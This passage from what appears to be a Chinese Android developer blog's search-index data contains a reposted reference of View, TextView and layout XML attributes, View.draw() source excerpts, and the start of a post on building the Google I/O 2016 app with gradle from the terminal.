GOTO 2016 • Exploring RxJava 2 for Android • Jake Wharton - YouTube– 掘金– 使用concat从数据库，内存，网络三层中获取数据– RxJava 教程第四部分：并发 之数据流发射太快如何办 rxjava2操作符详解","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"rxjava2","slug":"rxjava2","permalink":"https://haldir65.github.io/tags/rxjava2/"}]},{"title":"View的属性大全[转载]","date":"2017-04-03T11:38:10.000Z","path":"2017/04/03/2017-04-03-properties-of-view/","text":"转自Android属性大全 android:alpha setAlpha(float) 属性说明: 视图透明度，值在0-1之间。0为完全透明，1为完全不透明。 android:background setBackgroundResource(int) 属性说明: 视图背景 android:clickable setClickable(boolean) 属性说明: 视图是否可点击 android:contentDescription setContentDescription(CharSequence) 属性说明: 设置View的备注说明，作为一种辅助功能提供,为一些没有文字描述的View提供说明 android:drawingCacheQuality setDrawingCacheQuality(int) 属性说明: &quot;设置绘图时半透明质量。有可以取以下3个值 auto——默认，由框架决定 high——高质量，使用较高的颜色深度，消耗更多的内存 low——低质量，使用较低的颜色深度，但是用更少的内存&quot; android:duplicateParentState 属性说明: 如果设置此属性，将直接从父容器中获取绘图状态（光标，按下等） android:fadeScrollbars setScrollbarFadingEnabled(boolean) 属性说明: 定义在ScrollBar没有使用时，是否褪色。 android:fadingEdgeLength getVerticalFadingEdgeLength() 属性说明: 设置边框渐变的长度。 android:filterTouchesWhenObscured setFilterTouchesWhenObscured(boolean) 属性说明: view所在窗口被其它可见窗口遮住时，是否过滤触摸事件。 android:fitsSystemWindows setFitsSystemWindows(boolean) 属性说明: 设置布局调整时是否考虑系统窗口（如状态栏） android:focusable setFocusable(boolean) 属性说明: 设置是否获得焦点。若有requestFocus()被调用时，后者优先处理。注意在表单中想设置某一个如EditText获取焦点，光设置这个是不行的，需要将这个EditText前面的focusable都设置为false才行。在Touch模式下获取焦点需要设置focusableInTouchMode为true。 android:focusableInTouchMode setFocusableInTouchMode(boolean) 属性说明: 设置在Touch模式下View是否能取得焦点。 android:hapticFeedbackEnabled setHapticFeedbackEnabled(boolean) 属性说明: 是否启用触摸反馈，启用后就是在点击等操作时会有震动等反馈效果 android:id setId(int) 属性说明: 给当前View设置一个在当前layout.xml中的唯一编号，可以通过调用View.findViewById() 或Activity.findViewById()根据这个编号查找到对应的View。不同的layout.xml之间定义相同的id不会冲突。 android:importantForAccessibility setImportantForAccessibility(int) 属性说明: 设置可达性的重要性 android:isScrollContainer setScrollContainer(boolean) 属性说明: 设置当前View为滚动容器。这里没有测试出效果来，ListView/ GridView/ ScrollView根本就不用设置这个属性，而EdidText设置android:scrollbars也能出滚动条 android:keepScreenOn setKeepScreenOn(boolean) 属性说明: 视图在可见的情况下是否保持唤醒状态。 android:layerType setLayerType(int,Paint) 属性说明: &quot;设置指定层的类型，可以取以下3个值： none——不指定 software——软件层。 hardware——硬件层。使用硬件加速。&quot; android:layoutDirection setLayoutDirection(int) 属性说明: 定义布局图纸的方向 android:longClickable setLongClickable(boolean) 属性说明: 是否响应长点击事件 android:minHeight setMinimumHeight(int) 属性说明: 设置视图最小高度 android:minWidth setMinimumWidth(int) 属性说明: 设置视图最小宽度 android:nextFocusDown setNextFocusDownId(int) 属性说明: 向下移动焦点时，下一个获取焦点的view的id android:nextFocusForward setNextFocusForwardId(int) 属性说明: 下一个获取焦点的view的id android:nextFocusLeft setNextFocusLeftId(int) 属性说明: 向左移动焦点时，下一个获取焦点的view的id android:nextFocusRight setNextFocusRightId(int) 属性说明: 向右移动焦点时，下一个获取焦点的view的id android:nextFocusUp setNextFocusUpId(int) 属性说明: 向上移动焦点时，下一个获取焦点的view的id android:onClick setOnClick()或 onClick(View view)属性说明: 点击时，要调用的方法的名称。 android:padding setPaddingRelative(int,int,int,int) 属性说明: 设置上下左右的边距 android:paddingBottom setPaddingRelative(int,int,int,int) 属性说明: 下边距 android:paddingEnd setPaddingRelative(int,int,int,int) 属性说明: 与android:paddingRight相同 android:paddingLeft setPadding(int,int,int,int) 属性说明: 左边距 android:paddingRight setPadding(int,int,int,int) 属性说明: 右边距 android:paddingStart setPaddingRelative(int,int,int,int) 属性说明: android:paddingLeft相同 android:paddingTop setPaddingRelative(int,int,int,int) 属性说明: 上边距 android:requiresFadingEdge setVerticalFadingEdgeEnabled(boolean) 属性说明: 定义滚动时边缘是否褪色 android:rotation setRotation(float) 属性说明: 旋转度数 android:rotationX setRotationX(float) 属性说明: 水平旋转度数 android:rotationY setRotationY(float) 属性说明: 竖直旋转度数 android:saveEnabled setSaveEnabled(boolean) 属性说明: 在配置改变等情况出现时是否保存view的状态数据。如果你的view有id，那默认系统就会帮你保存。 android:scaleX setScaleX(float) 属性说明: 水平方向缩放比例 android:scaleY setScaleY(float) 属性说明: 竖直方向缩放比例 android:scrollX 属性说明: x方向的滚动偏移。即在水平方向滚动了多少距离 android:scrollY 属性说明: y方向的滚动偏移。即在竖直方向滚动了多少距离 android:scrollbarAlwaysDrawHorizontalTrack 属性说明: 是否总是绘制水平滚动条的滚动轨道 android:scrollbarAlwaysDrawVerticalTrack 属性说明: 是否总是绘制竖直滚动条的滚动轨道 android:scrollbarDefaultDelayBeforeFade setScrollBarDefaultDelayBeforeFade(int) 属性说明: 滚动条在n毫秒后开始淡出。 android:scrollbarFadeDuration setScrollBarFadeDuration(int) 属性说明: 滚动条用多长时间淡出完毕。 android:scrollbarSize setScrollBarSize(int) 属性说明: 设置滚动条的尺寸。垂直滚动条的宽度、水平滚动条的高度 android:scrollbarStyle setScrollBarStyle(int) 属性说明: &quot;滚动条的风格。共4组值： insideOverlay——内贴图 insideInset——内插图 outsideOverlay——外贴图 outsideInset——外插图。 inside就是滚动条在绘制在padding以内；outside就是不需要绘制在padding内（即view的边界处）；Overlay是贴图，就是直接覆盖在内容的上方，这样内容可能会显示到滚动条下方去；Inset是插图，就是会在对应padding上加上滚动条的宽度，以不让内容显示到滚动条下面去。&quot; android:scrollbarThumbHorizontal 属性说明: 水平滚动块的drawable对象 android:scrollbarThumbVertical 属性说明: 竖直滚动块的drawable对象 android:scrollbarTrackHorizontal 属性说明: 水平滚动条滚动轨道的drawable对象 android:scrollbarTrackVertical 属性说明: 竖直滚动条滚动轨道的drawable对象 android:scrollbars 属性说明: &quot;设置可显示的滚动条。有3个取值: none——不显示滚动条 horizontal——显示水平滚动条 vertical——显示竖直滚动条&quot; android:soundEffectsEnabled setSoundEffectsEnabled(boolean) 属性说明: 点击或触摸该view时，是否需要有声音效果 android:tag 属性说明: string标识。类似id，id是整数标识。 android:textAlignment setTextAlignment(int) 属性说明: 设置文本的显示方式。 android:textDirection setTextDirection(int) 属性说明: 设置文本的显示方向。 android:transformPivotX setPivotX(float) 属性说明: 水平方向偏转量 android:transformPivotY setPivotY(float) 属性说明: 竖直方向偏转量 android:translationX setTranslationX(float) 属性说明: 水平方向的移动距离 android:translationY setTranslationY(float) 属性说明: 竖直方向的移动距离 android:visibility setVisibility(int) 属性说明: &quot;view的可见性。有3个取值： gone——不可见，同时不占用view的空间； invisible——不可见，但占用view的空间； visible——可见&quot; TextView属性说明 下面对TextView的属性进行说明 android:autoLink setAutoLinkMask(int) 属性说明: 设置是否“当文本为URL链接/email/电话号码/map时，文本显示为可点击的链接”。可选值(none/web/email/phone/map/all) android:autoText setKeyListener(KeyListener) 属性说明: 如果设置，将自动执行输入值的拼写纠正。此处无效果，在显示输入法并输入的时候起作用。 android:bufferType setText(CharSequence,TextView.BufferType) 属性说明: 指定getText()方式取得的文本类别。选项editable 类似于StringBuilder可追加字符，也就是说getText后可调用append方法设置文本内容。 android:capitalize setKeyListener(KeyListener) 属性说明: 设置自动大写属性。比如设置为2，自动大写单词首字符；设置为1，自动大写每句话的首字母等等。 android:cursorVisible setCursorVisible(boolean) 属性说明: 设定光标为显示/隐藏，默认显示。 android:digits setKeyListener(KeyListener) 属性说明: 设置允许输入哪些字符。如“1234567890.+-*/%\\n()” android:drawableBottom setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) 属性说明: 在text的下方输出一个drawable。如果指定一个颜色的话会把text的背景设为该颜色，并且同时和background使用时覆盖后者。 android:drawableEnd setCompoundDrawablesRelativeWithIntrinsicBounds(int,int,int,int) 属性说明: 在文本结尾处显示drawable对象。它的值可以是其它资源的引用，比如，&quot;@[+][package:]type:name&quot;或者&quot;?[package:][type:]name&quot;；也可以是颜色值，如&quot;#rgb&quot;, &quot;#argb&quot;, &quot;#rrggbb&quot;, or &quot;#aarrggbb&quot;。 android:drawableLeft setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) 属性说明: 在text的左边输出一个drawable。 android:drawablePadding setCompoundDrawablePadding(int) 属性说明: 设置text与drawable的间隔，与drawableLeft、drawableRight、drawableTop、drawableBottom一起使用，可设置为负数，单独使用没有效果。 android:drawableRight setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) 属性说明: 在text的右边输出一个drawable。 android:drawableStart setCompoundDrawablesRelativeWithIntrinsicBounds(int,int,int,int) 属性说明: 在文本开始处显示drawable对象。它的值可以是其它资源的引用，比如，&quot;@[+][package:]type:name&quot;或者&quot;?[package:][type:]name&quot;；也可以是颜色值，如&quot;#rgb&quot;, &quot;#argb&quot;, &quot;#rrggbb&quot;, or &quot;#aarrggbb&quot;。 android:drawableTop setCompoundDrawablesWithIntrinsicBounds(int,int,int,int) 属性说明: 在text的正上方输出一个drawable。 android:editable 属性说明: 设置是否可编辑。这里无效果，在EditView中才有效果。 android:editorExtras setInputExtras(int) 属性说明: 设置文本的额外的输入数据。在EditView中才有效果。 android:ellipsize setEllipsize(TextUtils.TruncateAt) 属性说明: 设置当文字过长时,该控件该如何显示。有如下值设置：”start”—–省略号显示在开头；”end”——省略号显示在结尾；”middle”—-省略号显示在中间；”marquee” ——以跑马灯的方式显示(动画横向移动) android:ems setEms(int) 属性说明: 设置TextView的宽度为N个字符的宽度。 android:fontFamily setTypeface(Typeface) 属性说明: 文本的字形体系。 android:freezesText setFreezesText(boolean) 属性说明: 设置保存文本的内容以及光标的位置。 android:gravity setGravity(int) 属性说明: 设置文本位置，如设置成“center”，文本将居中显示。 android:height setHeight(int) 属性说明: 设置文本区域的高度，支持度量单位：px(像素)/dp/sp/in/mm(毫米) android:hint setHint(int) 属性说明: Text为空时显示的文字提示信息，可通过textColorHint设置提示信息的颜色。 android:imeActionId setImeActionLabel(CharSequence,int) 属性说明: 设置IME动作ID。 android:imeActionLabel setImeActionLabel(CharSequence,int) 属性说明: 设置IME动作标签。在EditView再做说明。 android:imeOptions setImeOptions(int) 属性说明: 附加功能，设置右下角IME动作与编辑框相关的动作，如actionDone右下角将显示一个“完成”，而不设置默认是一个回车符号。 android:includeFontPadding setIncludeFontPadding(boolean) 属性说明: 设置文本是否包含顶部和底部额外空白，默认为true。 android:inputMethod setKeyListener(KeyListener) 属性说明: 为文本指定输入法，需要完全限定名（完整的包名）。例如：com.google.android.inputmethod.pinyin，但是这里报错找不到。 android:inputType setRawInputType(int) 属性说明: 设置文本的类型，用于帮助输入法显示合适的键盘类型。在EditView中再详细说明，这里无效果。 android:lineSpacingExtra setLineSpacing(float,float) 属性说明: 设置行间距。 android:lineSpacingMultiplier setLineSpacing(float,float) 属性说明: 设置行间距的倍数。如”1.2” android:lines setLines(int) 属性说明: 设置文本的行数，设置两行就显示两行，即使第二行没有数据。 android:linksClickable setLinksClickable(boolean) 属性说明: 设置链接是否点击连接，即使设置了autoLink。 android:marqueeRepeatLimit setMarqueeRepeatLimit(int) 属性说明: 在ellipsize指定marquee的情况下，设置重复滚动的次数，当设置为marquee_forever时表示无限次。 android:maxEms setMaxEms(int) 属性说明: 设置TextView的宽度为最长为N个字符的宽度。与ems同时使用时覆盖ems选项。 android:maxHeight setMaxHeight(int) 属性说明: 设置文本区域的最大高度 android:maxLength setFilters(InputFilter) 属性说明: 限制显示的文本长度，超出部分不显示。 android:maxLines setMaxLines(int) 属性说明: 设置文本的最大显示行数，与width或者layout_width结合使用，超出部分自动换行，超出行数将不显示。 android:maxWidth setMaxWidth(int) 属性说明: 设置文本区域的最大宽度 android:minEms setMinEms(int) 属性说明: 设置TextView的宽度为最短为N个字符的宽度。与ems同时使用时覆盖ems选项。 android:minHeight setMinHeight(int) 属性说明: 设置文本区域的最小高度 android:minLines setMinLines(int) 属性说明: 设置文本的最小行数，与lines类似。 android:minWidth setMinWidth(int) 属性说明: 设置文本区域的最小宽度 android:numeric setKeyListener(KeyListener) 属性说明: 如果被设置，该TextView有一个数字输入法。此处无用，设置后唯一效果是TextView有点击效果，此属性在EdtiView将详细说明。 android:password setTransformationMethod(TransformationMethod) 属性说明: 以小点”.”显示文本 android:phoneNumber setKeyListener(KeyListener) 属性说明: 设置为电话号码的输入方式。 android:privateImeOptions setPrivateImeOptions(String) 属性说明: 设置输入法选项，在EditText中才有作用。 android:scrollHorizontally setHorizontallyScrolling(boolean) 属性说明: 设置文本超出TextView的宽度的情况下，是否出现横拉条。 android:selectAllOnFocus setSelectAllOnFocus(boolean) 属性说明: 如果文本是可选择的，让他获取焦点而不是将光标移动为文本的开始位置或者末尾位置。TextView中设置后无效果。 android:shadowColor setShadowLayer(float,float,float,int) 属性说明: 指定文本阴影的颜色，需要与shadowRadius一起使用。 android:shadowDx setShadowLayer(float,float,float,int) 属性说明: 设置阴影横向坐标开始位置。 android:shadowDy setShadowLayer(float,float,float,int) 属性说明: 设置阴影纵向坐标开始位置。 android:shadowRadius setShadowLayer(float,float,float,int) 属性说明: 设置阴影的半径。设置为0.1就变成字体的颜色了，一般设置为3.0的效果比较好。 android:singleLine setTransformationMethod(TransformationMethod) 属性说明: 设置单行显示。如果和layout_width一起使用，当文本不能全部显示时，后面用“…”来表示。如android:text=&quot;test_ singleLine &quot; android:singleLine=&quot;true&quot; android:layout_width=&quot;20dp&quot;将只显示“t…”。如果不设置singleLine或者设置为false，文本将自动换行 android:text setText(CharSequence,TextView.BufferType) 属性说明: 设置显示文本. android:textAllCaps setAllCaps(boolean) 属性说明: 设置文本全为大写。值为&quot;true&quot;或&quot;false&quot;。 android:textAppearance 属性说明: 设置文字外观。如“?android:attr/textAppearanceLargeInverse android:textColor setTextColor(int) 属性说明: 设置文本颜色 android:textColorHighlight setHighlightColor(int) 属性说明: 被选中文字的底色，默认为蓝色 android:textColorHint setHintTextColor(int) 属性说明: 设置提示信息文字的颜色，默认为灰色。与hint一起使用。 android:textColorLink setLinkTextColor(int) 属性说明: 文字链接的颜色. android:textIsSelectable isTextSelectable() 属性说明: 设置非编辑文本可否被选择。值为&quot;true&quot;或&quot;false&quot;。 android:textScaleX setTextScaleX(float) 属性说明: 设置文字之间间隔，默认为1.0f。 android:textSize setTextSize(int,float) 属性说明: 设置文字大小，推荐度量单位”sp”，如”15sp” android:textStyle setTypeface(Typeface) 属性说明: 设置字形[bold(粗体) 0, italic(斜体) 1, bolditalic(又粗又斜) 2] 可以设置一个或多个，用“|”隔开 android:typeface setTypeface(Typeface) 属性说明: 设置文本字体，必须是以下常量值之一：normal 0, sans 1, serif 2, monospace(等宽字体) 3] android:width setWidth(int) 属性说明: 设置文本区域的宽度，支持度量单位：px(像素)/dp/sp/in/mm(毫米)。 android:fadingEdgeLength 设置淡入淡出边缘的长度，可以接受大小值的单位是：px、dp、sp、in、mm，也可以参考大小值资源 android:fitsSystemWindows 是否适合系统窗体，取值为true或false。该属性只对不是子组件的组件有效 android:focusable 是否可以获取焦点，取值true或false android:focusableInTouchMode 是否可以在触摸模式下获取焦点，true或false android:hapticFeedbackEnabled 是否允许触摸反馈效果，true或false android:id 提供该组件的标识名，可以借助Activity或View实例的findViewById方法通过id获取对应的组件实例对象，其属性值的形式为：android:id=”@+id/id” android:isScrollContainer 设置该组件是否设置为滚动条容器，true或false android:keepScreenOn 控制该组件在显示的时候保持在屏幕显示，true或false android:longClickable 是否响应长时间点击事件，true或false android:minHeight 组件的最小高度，取值同android:fadingEdgeLength android:minWidth 组件的最小宽度，取值同android:fadingEdgeLength android:nextFocusDown 设置下一个向下获取焦点的组件，取值为id android:nextFocusLeft 设置下一个向左获取焦点的组件，取值为id android:nextFocusRight 设置下一个向右获取焦点的组件，取值为id android:nextFocusUp 设置下一个向上获取焦点的组件，取值为id android:padding 设置上、下、左、右4个边缘的填充距离，必须是一个大小值，取值同android:fadingEdgeLength android:paddingBottom 设置下端边缘的填充距离，取值同android:padding android:paddingLeft 设置左端边缘的填充距离，取值同android:padding android:paddingRight 设置右端边缘的填充距离，取值同android:padding android:paddingTop 设置上端边缘的填充距离，取值同android:padding android:saveEnabled 是否允许保存状态，取值为true或false android:scrollX 设置垂直滚动条的位移量，必须是一个大小值，取值同android:padding android:scrollY 设置水平滚动条的位移量，必须是一个大小值，取值同android:padding android:scrollbarAlwaysDrawHorizontalTrack 是否总是设置水平滚动条滑块，true或false android:scrollbarAlwaysDrawVerticalTrack 是否总是设置垂直滚动条滑块，true或false android:scrollbarSize 设置垂直滚动条的宽度和水平滚动条的长度，必须是一个大小值，取值同android:padding android:scrollbarStyle 设置滚动条的样式，取值为下列之一： insideOverlay在填充区域内，覆盖形式 insideInset在填充区域内，插进形式（凹进） outsideOverly在绑定组件边缘，覆盖形式 outsideInset在绑定组件边缘，插进形似 android:scrollbarThumbHorizontal 设置水平滚动条按钮的绘制资源，必须引用可绘制资源 android:scrollbarThumbVertical 设置垂直滚动条按钮的绘制资源，必须引用可绘制资源 android:scrollbarTrackHorizontal 设置水平滚动条轨道的绘制资源，必须引用可绘制资源 android:scrollbarTrackVertical 设置水平滚动条轨道的绘制资源，必须引用可绘制资源 android:scrollbars 设置滚动显示，可以为一下一个或多个值： none不显示滚动条 horizontal只显示水平滚动条 vertical只显示垂直滚动条 android:soundEffectsEnabled 是否允许音效，取值为true或false android:tag 设置标记内容，可以通过View类实例的getTag方法获取该组件的标记内容，或者使用findViewByTag通过标记来查找相应的子组件 android:visibility 设置初始化可见状态，取值为以下之一： visible可见（默认值） invisible不可见（其所占空间将留出） gone完全不可见（其所占空间都不会留出） 线性布局LinearLayout组件属性列表 属性说明 android:baselineAligned 基线对齐 android:baselineAlignedChildIndex 以指定子组件作为基线对齐 android:gravity 指定该物体放入其容器的重心位置，取值为下列之一： top上方，物体大小不变 bottom下方，物体大小不变 left左方，物体大小不变 right右方，物体大小不变 center_vertical垂直方向的中间，物体大小不变 fill_vertical填满垂直方向，自动进行大小调整 center_horizontal水平方向的中间，大小不变 fill_horizontal填满水平方向，自动进行大小调整 center居中（既是水平也是垂直方向的中间） fill填满整个容器 clip_vertical clip_horizontal android:orientation 布局方向，取值为下列之一： horizontal水平的 vertical垂直的（默认值） android:weightSum 组件的比重和 LinearLayout_Layout属性说明 android:layout_gravity 当前子组件的心位置 android:layout_height 当前子组件的高度 android:layout_weight 当前子组件的空间比重，取值为浮点数 android:layout_width 当前子组件的宽度 RalativeLayout属性说明 android:gravity 设置添加组件的重心 android:ignoreGravity 忽略布局重心的影响 RalativeLayout_Layout属性说明 android:layout_above 将当前组件的下边缘放置于参照组件之上，该属性为参照组件的ID android:layout_alignBaseline 当前组件与参照组件的基线对齐，该属性为参照组件的ID android:layout_alignBottom 当前组件与参照组件的下边界对齐，该属性为参照组件的ID android:layout_alignLeft 当前组件与参照组件的左边界对齐，该属性为参照组件的ID android:layout_alignParenBottom 当前组件与父组件的下边界对齐，true或false android:layout_alignParentLeft 当前组件与父组件的左边界对齐，true或false android:layout_alignParentRight 当前组件与父组件的右边界对齐，true或false android:layout_alignParentTop 当前组件与父组件的上边界对齐，true或false android:layout_alignRight 当前组件与参照组件的右边界对齐，该属性为参照组件的ID android:layout_alignTop 当前组件与参照组件的上边界对齐，该属性为参照组件的ID android:layout_alignWithParentIfMissing 如果对应的兄弟元素找不到的话就以父元素做参照物 true或false android:layout_below 将当前组件的上边缘放置于参照组件之下，该属性为参照组件的ID android:layout_centerHorizontal 当前组件放置到父组件的水平居中的位置 android:layout_centerInParent 当前组件放置到父组件的重心位置 android:layout_centerVertical 当前组件放置到父组件垂直居中的位置 android:layout_toLeftOf 将当前组件的右边缘放置于参照组件之下，该属性为参照组件的ID android:layout_toRightOf 将当前组件的左边缘放置于参照组件之下，该属性为参照组件的ID AbsoluteLayout_Layout属性说明 android:layout_x 当前组件的x坐标位置（从左到右方向） android:layout_y 当前组件的y坐标位置（从上到下方向） FrameLayout属性说明 android:foreground 前置图片 android:foregroundGravity 前置图片重心 android:measureAllChildren 在切换显示时是否侧重所有子组件的大小 android:layout_gravity 添加组件的重心 FrameLayout_Layout属性说明 android:layout_gravity 当前子组件所添加的重心位置 TableLayout属性说明 android:collapseColumns 设置允许折叠的列编号，列编号基于0，属性值可以是单个或多个列编号，编号与编号直接用逗号”,”分隔 android:shrinkColumns 设置允许收缩的列编号，列编号基于0，属性值可以是单个或多个列编号，编号与编号直接用逗号”,”分隔 android:stretchColumns 设置允许伸展的列编号，列编号基于0，属性值可以是单个或多个列编号，编号与编号直接用逗号”,”分隔 TableRow_Cell属性说明 android:layout_column 设置该单元格的列编号（基于0） android:layout_span 指明该单元格可以跨越的列数 AbsListView属性说明 android:cacheColorHint 设置缓冲颜色 android:drawSelectorOnTop 是否将选择器绘制在备选条目上方，取值为true或false android:fastScrollEnabled 允许快速滚动 android:listSelector 指示选择器的内容 android:scrollingCache 滚动时是否使用绘制缓冲，true或false android:smoothScrollbar 平滑滚动条 android:stackFromBottom 从下方堆叠条目 android:textFilterEnbled 是否允许过滤 android:transcriptMode设置抄本模式 ListView属性说明 android:choiceMode 选择模式 android:divider 分割线颜色或组件的参考 android:dividerHeight 分割线高度 android:entries 指定绑定到当前列表视图的一个数组资源 android:footerDividersEnabled 是否允许页脚分割线 android:headerDividersEnabled 是否允许页眉分割线 GridView属性说明 android:columnWidth 指定列宽 android:gravity 添加组件的重心位置 android:horizontalSpacing 水平空间 android:numColumns 指定列数 android:strechMode 伸展模式 android:verticalSpacing 垂直空间 Gallery属性说明 android:animationDuration 动画持续时间 android:gravity 添加组件的重心位置 android:spacing 间隔空间 android:unselectedAlpha 非选择条目的透明度 TextView属性说明 android:autoLink 是否自动链接（内容是网址或是电子邮件时） android:autoText 自动更新拼音错误 android:bufferType 设置缓冲区类型 android:capitalize 自动大写 android:cursorVisible 光标是否可见，true或false android:digits 所接受的数字字符 android:drawableBottom 在文本下方绘制 android:drawableLeft 在文本左方绘制 android: drawablePadding 绘制填充区 android: drawableRight 在文本右方绘制 android: drawableTop 在文本上方绘制 android:editable 是否可编辑，true或false android:editorExtras 设置文本的额外的输入数据。在EditView中才有效果 android:ellipsize 当内容过长时会自动打断单词内容 android:ems 设置TextView的宽度为N个字符的宽度 android:enabled 是否可用，true或false android:freezesText 是否冻结文本 android:gravity 指明文本的重心位置 android:height 高度值 android:hint 指示内容 android:imeActionId 设置IME动作ID android:imeActionLabel 设置IME动作标签 android:imeOptions 输入法选项 android:includeFontPadding 设置文本是否包含顶部和底部额外空白，默认为true android:inputMethod 指定输入法 android:inputType 输入类型，取值为下列之一： none text普通文本 textCapCharacters大写字符 textCapWords单词首字母大写 textCapSentences句子首字母大写 textAutoCorret自动更正 textAutoComplete自动完成 textMultiLine多行内容 textUri，Uri textEmailAddress电子邮件地址 textEmailSubject电子邮件主题 textShortMessage短消息 textLongMessage长消息 textPersonName个人姓名 textPostalAddress邮政地址 textPassword密码 textVIsiblePassword可见的密码 textWebEditText网页格式 textFilter过滤字符串 textPhonetic语言发音 number数字 numberSigned有符号数字 numberDecimal十进制数字 phone电话号码 datetime日期时间 date日期 time时间 android:lineSpacingExtra 设置行间距 android:lineSpacingMultiplier 设置行间距的倍数 android:lines 设置文本行数 android:linksClickable 设置链接是否点击连接，即使设置了autoLick android:marqueeRepeatLimit 来回移动的动画次数 android:maxEms 设置TextView的宽度为最长为N个字符的宽度。与ems同时使用时覆盖ems选项 android:maxHeight 物体的最大高度 android:maxLength 最大文本长度 android:maxLines 最大行数 android:minWidth 物体的最大宽度 android:minEms 设置TextView的宽度为最短为N个字符的宽度。与ems同时使用时覆盖ems选项 android:minHeight 物体的最小高度 android:minLines 最小文本行数 android:minWidth 物体的最小宽度 android:numeric 是否使用数字输入方式 android:password 是否使用密码输入方式 android:phonenumber 是否使用电话号码输入方式 android:privateImeOptions 设置输入法选项 android:scrollHorizontally 设置文本超出TextView的宽度的情况下，是否出现横拉条 android:selectAllOnFocus 如果文本是可选择的，让他获取焦点而不是将光标移动为文本的开始位置或者末尾位置。TextView中设置后无效果。 android:shadowColor 文本阴影颜色 android:shadowDx 阴影的水平偏移 android:shadowDy 阴影的垂直偏移 android:shadowRadius 阴影的半径 android:singleLine 是否单行（不自动换行） android:text 显示的文本内容 android:textApperance 基本字体颜色、字样、大小和样式 android:textColor 文本颜色 android: textColorHighlight 文本高亮颜色 android: textColorHint 文本提示颜色 android:textColorLink 文本链接颜色 android:textScaleX 文本缩放因数 android:textSize 文本大小 android:textStyle 文本样式，取值为下列之一： bold粗体 italic斜体 bolditalic粗斜体 android:typeface 字样 android:width 物体的高度 AutoCompleteTextView属性说明 android:completionHint 显示提示 android:completionHintView 提示视图 android:completionThreshold 设置开始提示的字符数 android:dropDownAnchor 下拉框链接视图 android:dropDownSelector 下拉框选择器 android:dropDownWIdth 下拉框宽度 ImageView属性说明 android:adjustViewBounds 是否调整视图范围 android:baselineAlignBottom 是否按照下端基线对齐 android:cropToPadding 是否按照填充进行裁剪 android:maxHeight 设置最大高度 android:maxWidth 设置最大宽度 android:scaleType 缩放类型，取值为下列之一： matrix图片真实大小 fitXY适合图片大小 fitStart fitCenter fitEnd center居中显示 centerCrop centerInside android:src 设置绘制用内容 android:tint 设置染色颜色值 android:layout_above=&quot;@id/xxx&quot; 将控件置于给定ID控件之上 android:layout_below=&quot;@id/xxx&quot; 将控件置于给定ID控件之下 android:layout_toLeftOf=&quot;@id/xxx&quot; 将控件的右边缘和给定ID控件的左边缘对齐 android:layout_toRightOf=&quot;@id/xxx&quot; 将控件的左边缘和给定ID控件的右边缘对齐 android:layout_alignLeft=&quot;@id/xxx&quot; 将控件的左边缘和给定ID控件的左边缘对齐 android:layout_alignTop=&quot;@id/xxx&quot; 将控件的上边缘和给定ID控件的上边缘对齐 android:layout_alignRight=&quot;@id/xxx&quot; 将控件的右边缘和给定ID控件的右边缘对齐 android:layout_alignBottom=&quot;@id/xxx&quot; 将控件的底边缘和给定ID控件的底边缘对齐 android:layout_alignParentLeft=&quot;true&quot; 将控件的左边缘和父控件的左边缘对齐 android:layout_alignParentTop=&quot;true&quot; 将控件的上边缘和父控件的上边缘对齐 android:layout_alignParentRight=&quot;true&quot; 将控件的右边缘和父控件的右边缘对齐 android:layout_alignParentBottom=&quot;true&quot; 将控件的底边缘和父控件的底边缘对齐 android:layout_centerInParent=&quot;true&quot; 将控件置于父控件的中心位置 android:layout_centerHorizontal=&quot;true&quot; 将控件置于水平方向的中心位置 android:layout_centerVertical=&quot;true&quot; 将控件置于垂直方向的中心位置 updateView.getScrollX和getScrollY返回的是mScrollX和mScrollY。这个值在View.draw()方法中用到了: if (offsetForScroll) { canvas.translate(mLeft - sx, mTop - sy); } else { if (!drawingWithRenderNode) { canvas.translate(mLeft, mTop); } if (scalingRequired) { if (drawingWithRenderNode) { // TODO: Might not need this if we put everything inside the DL restoreTo = canvas.save(); } // mAttachInfo cannot be null, otherwise scalingRequired == false final float scale = 1.0f / mAttachInfo.mApplicationScale; canvas.scale(scale, scale); } } 所以只是一个canvas的translate罢了。 另外，在draw里面还有一段直接buildCache的方法.View.draw() Bitmap cache = null; int layerType = getLayerType(); // TODO: signify cache state with just &#39;cache&#39; local if (layerType == LAYER_TYPE_SOFTWARE || !drawingWithRenderNode) { if (layerType != LAYER_TYPE_NONE) { // If not drawing with RenderNode, treat HW layers as SW layerType = LAYER_TYPE_SOFTWARE; buildDrawingCache(true); } cache = getDrawingCache(true); } // 省略部分 if (!drawingWithDrawingCache) { if (drawingWithRenderNode) { mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; ((DisplayListCanvas) canvas).drawRenderNode(renderNode); //走RenderNode } else { // Fast path for layouts with no backgrounds if ((mPrivateFlags &amp; PFLAG_SKIP_DRAW) == PFLAG_SKIP_DRAW) { mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; dispatchDraw(canvas); } else { draw(canvas); } } } else if (cache != null) { // 直接拿bitmapcache去 mPrivateFlags &amp;= ~PFLAG_DIRTY_MASK; if (layerType == LAYER_TYPE_NONE || mLayerPaint == null) { // no layer paint, use temporary paint to draw bitmap // ............. canvas.drawBitmap(cache, 0.0f, 0.0f, cachePaint); } else { // use layer paint to draw the bitmap, merging the two alphas, but also restore canvas.drawBitmap(cache, 0.0f, 0.0f, mLayerPaint); // ........ } }","tags":[{"name":"android","slug":"android","permalink":"https://haldir65.github.io/tags/android/"},{"name":"tools","slug":"tools","permalink":"https://haldir65.github.io/tags/tools/"}]},{"title":"使用IDE内置的Terminal","date":"2017-03-11T22:28:51.000Z","path":"2017/03/11/2017-03-11-utilizing-the-terminal-in-android-studio/","text":"这周终于把Google I/O 2016的Android App在Device上跑起来了，顺便尝试多多使用命令行进行编译或者安装。 1. 编译Android client并安装到本地设备官方提供了比较完善的Build Instructions，对于习惯于shift+F10的我来说，还是有点麻烦。 clone下来iosched，修改gradle.properities里面的supportLib等值，参考Build Instruction ， gradlew clean assembleDebug 往往这一步会开始下载gradle，非常耗时。参考了stackOverFlow，自己去下载gradle 3.3 -all.zip，放到/gradle/wrapper文件夹下，修改gradle-wrapper.properities，将其中的distributionUrl改成 distributionUrl=gradle-3.3-all.zip 等于直接省去上述下载步骤。Build完成后，敲入命令行 gradlew installNormalDebug 不出意外的话，即可进入主页面。 2. Server端配置Google io 2016 Android Client提供了Map 